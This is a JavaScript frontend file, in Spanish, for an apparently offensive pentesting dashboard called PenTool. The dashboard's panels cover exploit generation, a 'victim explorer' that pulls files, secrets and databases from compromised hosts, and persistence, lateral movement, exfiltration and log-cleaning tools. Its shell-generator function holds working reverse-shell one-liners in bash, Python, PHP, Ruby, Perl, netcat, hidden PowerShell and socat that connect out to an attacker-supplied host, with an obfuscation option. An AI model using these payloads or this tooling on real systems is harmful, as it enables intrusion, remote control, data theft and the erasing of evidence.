    document.getElementById('copy-lan-url')?.addEventListener('click', copyLanUrl);
    document.getElementById('copy-system-lan-url')?.addEventListener('click', copyLanUrl);

    const terminalExecuteButton = document.getElementById('terminal-command-btn');
    const terminalAnalyzeButton = document.getElementById('terminal-analyze-btn');
    const terminalChatButton = document.getElementById('terminal-chat-btn');
    const sensitiveSearchButton = document.getElementById('sensitive-search-btn');
    if (terminalExecuteButton) {
        terminalExecuteButton.addEventListener('click', executeTerminalCommand);
    }
    const terminalCommandInput = document.getElementById('terminal-command-input');
    if (terminalCommandInput) {
        terminalCommandInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                e.preventDefault();
                executeTerminalCommand();
            }
        });
    }
    if (terminalAnalyzeButton) {
        terminalAnalyzeButton.addEventListener('click', analyzeTerminalOutput);
    }
    if (terminalChatButton) {
        terminalChatButton.addEventListener('click', sendChatToAi);
    }
    if (sensitiveSearchButton) {
        sensitiveSearchButton.addEventListener('click', searchSensitiveData);
    }

    const stopSessionButton = document.getElementById('stop-session-btn');
    const destroySessionButton = document.getElementById('destroy-session-btn');
    const pauseScanButton = document.getElementById('pause-scan-btn');
    if (stopSessionButton) {
        stopSessionButton.addEventListener('click', stopSession);
    }
    if (destroySessionButton) {
        destroySessionButton.addEventListener('click', destroySession);
    }
    if (pauseScanButton) {
        pauseScanButton.addEventListener('click', pauseActiveScan);
    }

    document.getElementById('refresh-exploit-library-btn')?.addEventListener('click', loadExploitLibrary);
    document.getElementById('exploit-filter-target')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            e.preventDefault();
            loadExploitLibrary();
        }
    });
    document.getElementById('new-exploit-artifact-btn')?.addEventListener('click', () => fillExploitArtifactForm(null));
    document.getElementById('exploit-editor-form')?.addEventListener('submit', saveExploitArtifact);
    document.getElementById('delete-exploit-btn')?.addEventListener('click', deleteSelectedExploitArtifact);
    document.getElementById('analyze-exploit-btn')?.addEventListener('click', analyzeSelectedExploit);
    document.getElementById('exploit-ai-generate-btn')?.addEventListener('click', askExploitAi);
    document.getElementById('apply-ai-code-btn')?.addEventListener('click', () => {
        if (!pendingAiExploitCode) {
            showToast('No hay código sugerido para aplicar.', 'warning');
            return;
        }
        const codeToApply = extractCodeFromResponse(pendingAiExploitCode);
        document.getElementById('exploit-code').value = codeToApply;
        showToast('Código sugerido aplicado al editor.', 'success');
    });
    document.getElementById('copy-ai-code-btn')?.addEventListener('click', copyAiCode);
    document.getElementById('copy-code-btn')?.addEventListener('click', copyEditorCode);
    document.getElementById('run-exploit-artifact-btn')?.addEventListener('click', runSelectedExploitArtifact);
    document.getElementById('refresh-generated-code-btn')?.addEventListener('click', loadGeneratedCode);

    const llmModelSelect = document.getElementById('llm-model-select');
    if (llmModelSelect) {
        llmModelSelect.addEventListener('change', (e) => {
            if (e.target.value) {
                const llmModelInput = document.getElementById('llm-model-input');
                if (llmModelInput) llmModelInput.value = e.target.value;
            }
        });
    }
}

// ============================================
// CVE INTELLIGENCE ENGINE
// ============================================
function setupCVEHandlers() {
    const cveForm = document.getElementById('cve-form');
    if (!cveForm) return;

    cveForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const target = document.getElementById('cve-target').value.trim();
        const service = document.getElementById('cve-service').value.trim();
        const version = document.getElementById('cve-version').value.trim();
        const port = document.getElementById('cve-port').value.trim();
        if (!service) { showToast('Ingresa un servicio', 'error'); return; }

        try {
            showToast('Buscando CVEs...', 'info');
            const data = await apiFetch('/api/cve/scan', {
                method: 'POST',
                body: JSON.stringify({ target, service, version, port }),
            });

            const resultsEl = document.getElementById('cve-results');
            const cves = data.cves_found || [];
            if (cves.length === 0) {
                resultsEl.innerHTML = '<div class="empty-state"><i class="fas fa-shield-check"></i><p>No se encontraron CVEs</p></div>';
            } else {
                resultsEl.innerHTML = cves.map((cve, i) =>
                    `<div class="activity-item">
                        <span class="activity-time">${cve.cvss_score ? 'CVSS ' + cve.cvss_score : ''}</span>
                        <span class="activity-text">
                            <strong>${cve.cve_id}</strong>
                            <span class="severity-label ${(cve.severity || 'UNKNOWN').toLowerCase()}">${cve.severity || 'UNKNOWN'}</span>
                            <p style="margin:4px 0 0;font-size:12px;color:#6b7f99">${(cve.description || '').substring(0, 200)}</p>
                        </span>
                    </div>`
                ).join('');
            }

            const codeEl = document.getElementById('cve-exploit-code');
            if (data.exploit_code) {
                codeEl.textContent = data.exploit_code;
            } else {
                codeEl.textContent = '# No se generó código automáticamente';
            }
            showToast(`Analizados ${data.services_analyzed || 1} servicios`, 'success');
        } catch (err) {
            showToast(`Error: ${err.message}`, 'error');
        }
    });

    document.getElementById('cve-copy-btn')?.addEventListener('click', () => {
        const code = document.getElementById('cve-exploit-code').textContent;
        navigator.clipboard.writeText(code).then(() => showToast('Copiado', 'success'));
    });

    document.getElementById('cve-save-btn')?.addEventListener('click', async () => {
        const code = document.getElementById('cve-exploit-code').textContent;
        if (!code || code.startsWith('#')) { showToast('No hay código para guardar', 'error'); return; }
        try {
            const target = document.getElementById('cve-target').value.trim() || 'unknown';
            const data = await apiFetch('/exploit-library', {
                method: 'POST',
                body: JSON.stringify({ target, title: 'Auto-generated CVE exploit', cve: '', language: 'python', code }),
            });
            showToast('Exploit guardado en biblioteca', 'success');
        } catch (err) {
            showToast(`Error: ${err.message}`, 'error');
        }
    });
}

// ============================================
// VICTIM EXPLORER
// ============================================
let explorerScanId = '';
let explorerConnected = false;

function explorerConnect(scanId) {
    if (!scanId) return;
    explorerScanId = scanId;
    explorerConnected = true;
    const toolbar = document.getElementById('explorer-toolbar');
    const toolbarActions = document.getElementById('explorer-toolbar-actions');
    if (toolbar) toolbar.style.display = 'block';
    if (toolbarActions) toolbarActions.style.display = 'flex';
    const connStatus = document.getElementById('explorer-conn-status');
    if (connStatus) {
        connStatus.className = 'explorer-conn-status connected';
        const icon = connStatus.querySelector('i');
        if (icon) icon.className = 'fas fa-plug';
        const text = connStatus.querySelector('span');
        if (text) text.textContent = 'Conectado a ' + scanId;
    }
    const output = document.getElementById('explorer-output');
    if (output) output.textContent = 'Conectado. Usa los comandos para explorar.';
    loadExplorerDownloads();
}

function explorerDisconnect() {
    explorerScanId = null;
    explorerConnected = false;
    const toolbar = document.getElementById('explorer-toolbar');
    const toolbarActions = document.getElementById('explorer-toolbar-actions');
    if (toolbar) toolbar.style.display = 'none';
    if (toolbarActions) toolbarActions.style.display = 'none';
    const connStatus = document.getElementById('explorer-conn-status');
    if (connStatus) {
        connStatus.className = 'explorer-conn-status disconnected';
        const icon = connStatus.querySelector('i');
        if (icon) icon.className = 'fas fa-plug';
        const text = connStatus.querySelector('span');
        if (text) text.textContent = 'Esperando sesión activa...';
    }
    const output = document.getElementById('explorer-output');
    if (output) output.textContent = 'Desconectado.';
}

function explorerUpdateSessionInfo(scan) {
    const infoEl = document.getElementById('explorer-session-info');
    const labelEl = document.getElementById('explorer-session-label');
    const targetEl = document.getElementById('explorer-session-target');
    if (!infoEl || !labelEl || !targetEl) return;
    if (scan && scan.scan_id) {
        infoEl.style.display = 'block';
        const access = scan.access_type || 'unknown';
        const hasRoot = scan.has_root ? '✅ Root' : '⏳ No root';
        labelEl.textContent = `${scan.scan_id}  ·  ${access}  ·  ${hasRoot}`;
        targetEl.textContent = scan.target || '';
    } else {
        infoEl.style.display = 'none';
    }
}

function setupExplorerHandlers() {
    const btnMap = {
        'explorer-ls-btn': async () => {
            const path = document.getElementById('explorer-path').value || '/';
            return apiFetch('/api/explorer/ls', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
        },
        'explorer-cat-btn': async () => {
            const path = document.getElementById('explorer-file-path').value;
            if (!path) { showToast('Ingresa un path', 'error'); return null; }
            return apiFetch('/api/explorer/cat', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
        },
        'explorer-dl-btn': async () => {
            const path = document.getElementById('explorer-file-path').value;
            if (!path) { showToast('Ingresa un path', 'error'); return null; }
            const result = await apiFetch('/api/explorer/download', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: path }) });
            loadExplorerDownloads();
            return result;
        },
        'explorer-search-btn': async () => {
            const pattern = document.getElementById('explorer-search-pattern').value;
            if (!pattern) { showToast('Ingresa un patrón', 'error'); return null; }
            return apiFetch('/api/explorer/search', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: pattern }) });
        },
        'explorer-grep-btn': async () => {
            const pattern = document.getElementById('explorer-search-pattern').value;
            if (!pattern) { showToast('Ingresa un patrón', 'error'); return null; }
            return apiFetch('/api/explorer/grep', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId, command: pattern }) });
        },
        'explorer-dbs-btn': async () => {
            return apiFetch('/api/explorer/databases', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
        },
        'explorer-sensitive-btn': async () => {
            return apiFetch('/api/explorer/sensitive', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
        },
        'explorer-sysinfo-btn': async () => {
            return apiFetch('/api/explorer/system', { method: 'POST', body: JSON.stringify({ scan_id: explorerScanId }) });
        },
        'explorer-db-query-btn': async () => {
            const dbType = document.getElementById('explorer-db-type').value;
            const host = document.getElementById('explorer-db-host').value || 'localhost';
            const user = document.getElementById('explorer-db-user').value || 'root';
            const pass = document.getElementById('explorer-db-pass').value;
            const dbName = document.getElementById('explorer-db-name').value;
            const query = document.getElementById('explorer-db-query').value;
            return apiFetch('/api/explorer/db-query', {
                method: 'POST',
                body: JSON.stringify({ scan_id: explorerScanId, db_type: dbType, host, user, password: pass, database: dbName, query }),
            });
        },
    };

    for (const [id, handler] of Object.entries(btnMap)) {
        document.getElementById(id)?.addEventListener('click', async () => {
            if (!explorerConnected) {
                // Try auto-connect
                if (activeScanId && currentScanData) {
                    explorerConnect(activeScanId);
                } else {
                    showToast('No hay sesión activa para explorar', 'error');
                    return;
                }
            }
            try {
                const data = await handler();
                if (!data) return;
                const outputEl = document.getElementById('explorer-output');
                if (!outputEl) return;
                if (data.data && data.data.items) {
                    outputEl.textContent = data.data.items.map(i =>
                        `${i.permissions} ${i.owner} ${String(i.size).padStart(8)} ${i.name}`
                    ).join('\n') || '(directorio vacío)';
                } else if (data.data && data.data.content !== undefined) {
                    outputEl.textContent = data.data.content.substring(0, 10000);
                } else if (data.data && data.data.files) {
                    outputEl.textContent = data.data.files.join('\n');
                } else if (data.data && data.data.results) {
                    outputEl.textContent = data.data.results.join('\n');
                } else if (data.data && data.data.databases) {
                    outputEl.textContent = data.data.databases.map(d => `[${d.command}]\n${d.output.substring(0, 500)}`).join('\n---\n');
                } else if (data.data && data.data.findings) {
                    outputEl.textContent = data.data.findings.map(f => `=== ${f.label} ===\n${f.command}\n${f.output.substring(0, 500)}`).join('\n---\n');
                } else if (data.data && data.data.output) {
                    outputEl.textContent = data.data.output.substring(0, 10000);
                } else if (data.success === false) {
                    outputEl.textContent = `Error: ${JSON.stringify(data)}`;
                } else {
                    outputEl.textContent = JSON.stringify(data, null, 2).substring(0, 10000);
                }
                if (data.data && data.data.downloaded_to) {
                    showToast(`Descargado: ${data.data.downloaded_to}`, 'success');
                }
            } catch (err) {
                const outputEl = document.getElementById('explorer-output');
                if (outputEl) outputEl.textContent = `Error: ${err.message}`;
            }
        });
    }

    // Refresh button
    document.getElementById('explorer-refresh-btn')?.addEventListener('click', () => {
        if (activeScanId) {
            explorerConnect(activeScanId);
            fetchActiveScan();
        }
    });

    // Downloads refresh
    document.getElementById('explorer-downloads-refresh')?.addEventListener('click', loadExplorerDownloads);
}

async function loadExplorerDownloads() {
    try {
        const data = await apiFetch('/api/explorer/downloads');
        const files = data.data?.files || [];
        const el = document.getElementById('explorer-downloads-section');
        if (!el) return;
        if (files.length === 0) {
            el.innerHTML = '<div class="sd-empty"><i class="fas fa-download"></i><p>No hay descargas aún</p></div>';
            return;
        }
        el.innerHTML = files.map(f =>
            `<div style="display:flex;justify-content:space-between;align-items:center;padding:0.4rem 0;border-bottom:1px solid #f0f3f8;font-size:0.78rem">
                <span style="color:var(--text)">${f.name}</span>
                <span style="color:var(--muted)">${(f.size / 1024).toFixed(1)} KB</span>
            </div>`
        ).join('');
    } catch {}
}

// ============================================
// CHAT IA CON CONTEXTO COMPLETO
// ============================================
let chatHistory = [];
let chatConversations = [];
try {
    chatConversations = JSON.parse(localStorage.getItem('chatConversations') || '[]') || [];
} catch (e) {
    chatConversations = [];
    localStorage.removeItem('chatConversations');
}

function setupChatHandlers() {
    document.getElementById('chat-send-btn')?.addEventListener('click', sendChatMessage);
    document.getElementById('chat-input')?.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); sendChatMessage(); }
    });
    document.getElementById('chat-clear-btn')?.addEventListener('click', () => {
        document.getElementById('chat-input').value = '';
    });
    document.getElementById('chat-new-btn')?.addEventListener('click', startNewChat);
}

async function sendChatMessage() {
    const input = document.getElementById('chat-input');
    const msg = input.value.trim();
    if (!msg) return;

    input.value = '';
    appendChatMessage('user', msg);
    showChatTyping();

    try {
        const context = await buildChatContext();
        const response = await fetch(`${API_BASE_URL}/api/agent/chat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: msg, context, history: chatHistory.slice(-20) }),
        });
        const data = await response.json();
        hideChatTyping();
        const reply = data.response || data.message || 'Sin respuesta';
        appendChatMessage('assistant', reply);
        chatHistory.push({ role: 'user', content: msg });
        chatHistory.push({ role: 'assistant', content: reply });
        saveConversation();
    } catch (err) {
        hideChatTyping();
        appendChatMessage('system', `Error: ${err.message}. Usando modo local.`);
        const localReply = await localChatResponse(msg);
        appendChatMessage('assistant', localReply);
        chatHistory.push({ role: 'user', content: msg });
        chatHistory.push({ role: 'assistant', content: localReply });
        saveConversation();
    }
}

async function buildChatContext() {
    const ctx = { system: {}, scan: {}, cve: {}, explorer: {} };
    try {
        const health = await apiFetch('/health');
        ctx.system = { version: health.version || '?', status: 'online' };
        document.getElementById('ctx-system').textContent = 'online';
    } catch { ctx.system = { status: 'offline' }; document.getElementById('ctx-system').textContent = 'offline'; }

    const sid = localStorage.getItem('activeScanId');
    if (sid) {
        try {
            const scan = await apiFetch(`/scans/${sid}`);
            ctx.scan = { id: sid, target: scan.target || '?', status: scan.status || '?', phase: scan.phase || '?', events: (scan.events || []).slice(-5) };
            document.getElementById('ctx-scan').textContent = scan.target || sid;
        } catch { document.getElementById('ctx-scan').textContent = sid; }
    }

    try {
        const vulns = await apiFetch('/vulnerabilities');
        ctx.cve = { count: Array.isArray(vulns) ? vulns.length : 0 };
        document.getElementById('ctx-cve').textContent = ctx.cve.count;
    } catch {}

    return ctx;
}

function appendChatMessage(role, content) {
    document.getElementById('chat-empty')?.remove();
    const el = document.getElementById('chat-messages');
    const msg = document.createElement('div');
    msg.className = `chat-msg ${role}`;
    const time = new Date().toLocaleTimeString();
    msg.innerHTML = `
        <div class="chat-msg-header">
            <span class="chat-msg-role ${role}">${role === 'user' ? 'Tú' : role === 'assistant' ? 'IA' : 'Sistema'}</span>
            <span class="chat-msg-time">${time}</span>
        </div>
        <div class="chat-msg-content">${formatChatContent(content)}</div>`;
    el.appendChild(msg);
    el.scrollTop = el.scrollHeight;
}

function showChatTyping() {
    const el = document.getElementById('chat-messages');
    const typing = document.createElement('div');
    typing.className = 'chat-msg assistant chat-typing';
    typing.id = 'chat-typing-indicator';
    typing.innerHTML = '<span class="spinner"></span> Pensando...';
    el.appendChild(typing);
    el.scrollTop = el.scrollHeight;
}

function hideChatTyping() { document.getElementById('chat-typing-indicator')?.remove(); }

function formatChatContent(text) {
    if (!text) return '';
    return text
        .replace(/```(\w*)\n?([\s\S]*?)```/g, '<pre><code>$2</code></pre>')
        .replace(/`([^`]+)`/g, '<code>$1</code>')
        .replace(/\n/g, '<br>');
}

function copyCodeBlock(id) {
    const el = document.getElementById(id);
    if (!el) return;
    const text = el.textContent;
    navigator.clipboard.writeText(text).then(() => {
        showToast('Código copiado al portapapeles', 'success');
    }).catch(() => {
        // Fallback
        const ta = document.createElement('textarea');
        ta.value = text;
        document.body.appendChild(ta);
        ta.select();
        document.execCommand('copy');
        ta.remove();
        showToast('Código copiado', 'success');
    });
}

async function saveCodeBlock(id) {
    const el = document.getElementById(id);
    if (!el) return;
    const code = el.textContent;

    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.id = 'save-code-modal';
    modal.innerHTML = `
    <div class="modal-content" style="max-width:400px">
        <button class="modal-close" type="button" onclick="this.closest('.modal').remove()">&times;</button>
        <div class="modal-header">
            <h3><i class="fas fa-save"></i> Guardar código</h3>
        </div>
        <form class="modal-body" onsubmit="confirmSaveCode(event, '${id.replace(/'/g, "\\'")}')">
            <div class="form-group">
                <label>Nombre del archivo</label>
                <input type="text" id="save-code-filename" class="form-input mono-input" value="exploit.py" placeholder="exploit.py" required>
                <small class="field-hint">Usa la extensión adecuada (.py, .sh, .rb, .php, .ps1, etc.)</small>
            </div>
            <div class="form-group">
                <label>Categoría</label>
                <select id="save-code-category" class="form-input">
                    <option value="chat-generated">Generado en chat</option>
                    <option value="exploit">Exploit</option>
                    <option value="payload">Payload</option>
                    <option value="tool">Herramienta</option>
                    <option value="other">Otro</option>
                </select>
            </div>
            <div class="settings-actions">
                <button type="button" class="btn btn-secondary" onclick="this.closest('.modal').remove()">Cancelar</button>
                <button type="submit" class="btn btn-primary"><i class="fas fa-save"></i> Guardar</button>
            </div>
        </form>
    </div>`;
    document.body.appendChild(modal);
    document.getElementById('save-code-filename').focus();
    document.getElementById('save-code-filename').select();
}

async function confirmSaveCode(e, codeBlockId) {
    e.preventDefault();
    const el = document.getElementById(codeBlockId);
    if (!el) { showToast('Error: bloque de código no encontrado', 'error'); return; }
    const filename = document.getElementById('save-code-filename').value.trim();
    const category = document.getElementById('save-code-category').value;
    const code = el.textContent;
    if (!filename) { showToast('Ingresa un nombre de archivo', 'error'); return; }

    try {
        const data = await apiFetch('/api/code/save', {
            method: 'POST',
            body: JSON.stringify({ filename, code, category }),
        });
        showToast(`Guardado: ${data.filename}`, 'success');
        document.getElementById('save-code-modal').remove();
        loadGeneratedCode();
    } catch (err) {
        showToast(`Error: ${err.message}`, 'error');
    }
}

function saveConversation() {
    if (chatHistory.length === 0) return;
    const existing = chatConversations.find(c => c.id === currentChatId);
    if (existing) {
        existing.history = chatHistory;
        existing.updated = new Date().toISOString();
    } else {
        chatConversations.unshift({ id: currentChatId, title: chatHistory[0]?.content?.substring(0, 50) || 'Chat', history: chatHistory, created: new Date().toISOString(), updated: new Date().toISOString() });
    }
    if (chatConversations.length > 50) chatConversations = chatConversations.slice(0, 50);
    localStorage.setItem('chatConversations', JSON.stringify(chatConversations));
    renderChatHistory();
}

function renderChatHistory() {
    const el = document.getElementById('chat-history-list');
    if (chatConversations.length === 0) {
        el.innerHTML = '<div class="empty-state" style="min-height:60px"><p style="font-size:0.7rem">Sin historial</p></div>';
        return;
    }
    el.innerHTML = chatConversations.map(c =>
        `<div class="chat-history-item ${c.id === currentChatId ? 'active' : ''}" onclick="loadChat('${c.id}')">
            <strong>${c.title}</strong>
            <small>${new Date(c.updated).toLocaleDateString()}</small>
        </div>`
    ).join('');
}

function startNewChat() {
    currentChatId = 'chat_' + Date.now();
    chatHistory = [];
    document.getElementById('chat-messages').innerHTML = '<div class="empty-state" id="chat-empty"><i class="fas fa-comment-dots"></i><p>Inicia una conversación con la IA.</p></div>';
    renderChatHistory();
}

function loadChat(id) {
    const conv = chatConversations.find(c => c.id === id);
    if (!conv) return;
    currentChatId = id;
    chatHistory = conv.history || [];
    const el = document.getElementById('chat-messages');
    el.innerHTML = '';
    if (chatHistory.length === 0) {
        el.innerHTML = '<div class="empty-state" id="chat-empty"><i class="fas fa-comment-dots"></i><p>Conversación vacía.</p></div>';
    } else {
        chatHistory.forEach(m => appendChatMessage(m.role, m.content));
    }
    renderChatHistory();
}

async function localChatResponse(msg) {
    const lower = msg.toLowerCase();
    if (lower.includes('hola') || lower.includes('ayuda')) {
        return '¡Hola! Soy el asistente de PenTool. Puedo ayudarte con:\n- Escaneos de puertos y servicios\n- Búsqueda de CVEs y exploits\n- Análisis de resultados\n- Generación de payloads\n- Preguntas sobre herramientas de pentesting';
    }
    if (lower.includes('scan') || lower.includes('escaneo')) {
        const sid = localStorage.getItem('activeScanId');
        if (sid) return `Tienes un escaneo activo con ID: ${sid}. Usa la sección de escaneo para ver el progreso.`;
        return 'No hay escaneos activos. Ve a "Nuevo Escaneo" para iniciar uno.';
    }
    if (lower.includes('cve') || lower.includes('vuln')) {
        try {
            const vulns = await apiFetch('/vulnerabilities');
            const count = Array.isArray(vulns) ? vulns.length : 0;
            return `Se han detectado ${count} vulnerabilidades. Usa la sección CVE Intel para más detalles.`;
        } catch { return 'No se pudo consultar vulnerabilidades. Verifica que el servidor esté funcionando.'; }
    }
    if (lower.includes('ip') || lower.includes('red')) {
        try {
            const health = await apiFetch('/health');
            return `Sistema en línea. Host: ${health.hostname || 'desconocido'}, Plataforma: ${health.platform || 'desconocida'}`;
        } catch { return 'No se pudo obtener información del sistema.'; }
    }
    return `Entendido. No tengo una respuesta preparada para: "${msg.substring(0, 100)}". ¿Quieres preguntar sobre escaneos, CVEs, o el sistema?`;
}

let currentChatId = 'chat_' + Date.now();

// ============================================
// HERRAMIENTAS OFENSIVAS
// ============================================
function setupToolsHandlers() {
    // Tool tab switching
    document.querySelectorAll('.tool-tab').forEach(tab => {
        tab.addEventListener('click', () => {
            document.querySelectorAll('.tool-tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.tool-panel').forEach(p => p.classList.remove('active'));
            tab.classList.add('active');
            const panel = document.getElementById(`panel-${tab.dataset.tab}`);
            if (panel) panel.classList.add('active');
        });
    });

    const toolEndpoints = {
        'ps': { path: '/api/tools/portscan', build: () => ({
            target: document.getElementById('ps-target').value,
            ports: document.getElementById('ps-ports').value,
            scan_type: document.getElementById('ps-type').value,
        })},
        'ws': { path: '/api/tools/webscan', build: () => ({
            target: document.getElementById('ws-target').value,
            scan_type: document.getElementById('ws-type').value,
        })},
        'bf': { path: '/api/tools/bruteforce', build: () => ({
            target: document.getElementById('bf-target').value,
            service: document.getElementById('bf-service').value,
            username: document.getElementById('bf-user').value,
        })},
        'pe': { path: '/api/tools/privesc', build: () => ({
            scan_id: document.getElementById('pe-scan-id').value,
            type: document.getElementById('pe-os').value,
        })},
        'per': { path: '/api/tools/persistence', build: () => ({
            scan_id: document.getElementById('per-scan-id').value,
            method: document.getElementById('per-method').value,
            lhost: document.getElementById('per-lhost').value,
            lport: parseInt(document.getElementById('per-lport').value) || 4444,
        })},
        'lat': { path: '/api/tools/lateral', build: () => ({
            scan_id: document.getElementById('lat-scan-id').value,
            target: document.getElementById('lat-target').value,
            method: document.getElementById('lat-method').value,
            username: document.getElementById('lat-user').value,
            password: document.getElementById('lat-pass').value,
        })},
        'piv': { path: '/api/tools/pivot', build: () => ({
            scan_id: document.getElementById('piv-scan-id').value,
            action: document.getElementById('piv-action').value,
            target: document.getElementById('piv-target').value,
            port: parseInt(document.getElementById('piv-port').value) || 1080,
        })},
        'exf': { path: '/api/tools/exfiltrate', build: () => ({
            scan_id: document.getElementById('exf-scan-id').value,
            file_path: document.getElementById('exf-path').value,
            method: document.getElementById('exf-method').value,
            lhost: document.getElementById('exf-lhost').value,
        })},
        'lc': { path: '/api/tools/logcleaner', build: () => ({
            scan_id: document.getElementById('lc-scan-id').value,
            target_logs: document.getElementById('lc-targets').value.split(',').map(s => s.trim()).filter(Boolean),
        })},
    };

    for (const [prefix, cfg] of Object.entries(toolEndpoints)) {
        document.getElementById(`${prefix}-run-btn`)?.addEventListener('click', async () => {
            const btn = document.getElementById(`${prefix}-run-btn`);
            const output = document.getElementById(`${prefix}-output`);
            const body = cfg.build();
            if (!body.target && !body.scan_id) {
                showToast('Completa los campos requeridos', 'error'); return;
            }
            btn.disabled = true; btn.innerHTML = '<span class="spinner"></span> Ejecutando...';
            try {
                const data = await apiFetch(cfg.path, { method: 'POST', body: JSON.stringify(body) });
                output.textContent = JSON.stringify(data, null, 2).substring(0, 10000);
                if (data.success) showToast('Completado', 'success');
                else showToast('Error en ejecución', 'error');
            } catch (err) {
                output.textContent = `Error: ${err.message}`;
                showToast(err.message, 'error');
            }
            btn.disabled = false; btn.innerHTML = '<i class="fas fa-play"></i> Ejecutar';
        });
    }
}

// Reverse Shell Generator
function setupShellGenHandler() {
    let selectedShell = 'bash';

    document.querySelectorAll('.shell-type-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            document.querySelectorAll('.shell-type-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedShell = btn.dataset.shell;
        });
    });

    const shellTemplates = {
        bash: (lh, lp) => `bash -i >& /dev/tcp/${lh}/${lp} 0>&1`,
        python: (lh, lp) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${lh}",${lp}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`,
        php: (lh, lp) => `php -r '$sock=fsockopen("${lh}",${lp});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        ruby: (lh, lp) => `ruby -rsocket -e 'c=TCPSocket.new("${lh}",${lp});while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`,
        perl: (lh, lp) => `perl -e 'use Socket;$i="${lh}";$p=${lp};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'`,
        nc: (lh, lp) => `nc -e /bin/sh ${lh} ${lp}`,
        powershell: (lh, lp) => `powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TCPClient('${lh}',${lp});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()"`,
        socat: (lh, lp) => `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${lh}:${lp}`,
    };

    function obfuscate(cmd) {
        return cmd.split('').map(c => '\\x' + c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
    }

    document.getElementById('sg-generate-btn')?.addEventListener('click', () => {
        const lh = document.getElementById('sg-lhost').value.trim();
        const lp = parseInt(document.getElementById('sg-lport').value) || 4444;
        if (!lh) { showToast('Ingresa LHOST', 'error'); return; }
        const template = shellTemplates[selectedShell];
        if (!template) { showToast('Tipo no soportado', 'error'); return; }
        let cmd = template(lh, lp);
        const doObfuscate = document.getElementById('sg-obfuscate').checked;
        if (doObfuscate && selectedShell === 'bash') {
            cmd = `bash -c "echo -e '${obfuscate(cmd)}' | base64 -d | bash"`;
        }
        const output = document.getElementById('sg-output');
        output.textContent = cmd;
        document.getElementById('sg-copy-btn').style.display = 'inline-flex';
    });

    document.getElementById('sg-copy-btn')?.addEventListener('click', () => {
        const text = document.getElementById('sg-output').textContent;
        navigator.clipboard.writeText(text).then(() => showToast('Copiado', 'success'));
    });
}

// ============================================
// AUTH - Logout
// ============================================
function setupAuthLogout() {
    const logoutBtn = document.createElement('button');
    logoutBtn.className = 'btn btn-ghost';
    logoutBtn.innerHTML = '<i class="fas fa-sign-out-alt"></i> Salir';
    logoutBtn.style.marginLeft = '8px';
    logoutBtn.addEventListener('click', async () => {
        await fetch(`${API_BASE_URL}/api/auth/logout`, { method: 'POST' });
        localStorage.removeItem('authToken');
        localStorage.removeItem('authUser');
        localStorage.removeItem('apiToken');
        window.location.href = '/login';
    });
    const navAuth = document.querySelector('.nav-auth');
    if (navAuth) navAuth.appendChild(logoutBtn);
}

// ============================================
// OVERRIDE init()
// ============================================
async function init() {
    console.log('[init] started');
    setupNavigation();
    setupCommandPalette();
    setupFormHandlers();
    setupModalHandlers();
    initThreatChart();
    savePenToolApiKey(pentoolApiKey);
    setupCVEHandlers();
    setupExplorerHandlers();
    setupToolsHandlers();
    setupShellGenHandler();
    setupChatHandlers();
    setupAdminHandlers();
    setupAuthLogout();
    console.log('[init] handlers done');

    console.log('[init] rendering provider catalog');
    renderProviderCatalog('openai_compatible');
    document.getElementById('settings-section')?.classList.remove('active');
    console.log('[init] provider catalog rendered');

    console.log('[init] calling authenticate...');
    const authenticated = await authenticate();
    console.log('[init] authenticate result:', authenticated);
    if (!authenticated) { console.log('[init] auth failed, returning early'); return; }
    console.log('[init] auth OK, loading data...');

    renderChatHistory();
    loadChat(currentChatId);

    console.log('[init] starting Promise.all...');
    await Promise.all([
        loadLlmSettings(),
        loadRecentScans(),
        loadLatestVulnerabilities(),
        loadLatestExploits(),
        loadExploitLibrary(),
        loadGeneratedCode(),
        loadScheduledScans(),
        loadAuditLogs(),
        loadSystemHealth(),
        loadExplorerDownloads(),
        loadAdminUsers(),
    ]);
    console.log('[init] Promise.all done');
    logActivity('Dashboard cargado exitosamente');

    if (activeScanId) {
        document.getElementById('scan-detail-nav').style.display = 'flex';
        showSection('scan-detail');
        startActiveScanPolling();
    }

    setInterval(async () => {
        await Promise.all([loadRecentScans(), loadLatestVulnerabilities(), loadLatestExploits(), loadExploitLibrary(), loadScheduledScans(), loadAuditLogs()]);
    }, 30000);
}

// ============================================
// ADMIN: GESTIÓN DE USUARIOS
// ============================================

function setupAdminHandlers() {
